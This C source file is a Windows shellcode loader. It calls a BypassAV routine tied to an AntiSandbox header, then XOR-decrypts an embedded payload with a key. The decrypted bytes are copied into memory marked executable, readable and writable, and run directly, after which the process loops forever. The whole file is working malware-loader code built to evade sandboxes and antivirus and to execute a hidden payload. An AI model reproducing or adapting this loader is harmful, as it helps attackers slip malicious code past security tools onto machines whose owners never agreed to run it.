#include <windows.h>
#include "AntiSandbox.h"
#include "payload.h"
#include "key.h"


void ExecutePayload();


int main(int argc, char const *argv[])
{
	CreateThread(NULL,0,BypassAV,NULL,0,NULL);
	if(BypassAV(NULL)){
		ExecutePayload();	
	}
	return 0;
}

void ExecutePayload(){

	for(int i = 0; i < sizeof(Payload); i++) {
		Payload[i] = (Payload[i] ^ Payload_key[(i%sizeof(Payload_key))]);
	}	


	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(BUFFER, Payload, sizeof(Payload));
	(*(void(*)())BUFFER)();
	
	while(true){
		Sleep(1000);
	}
}


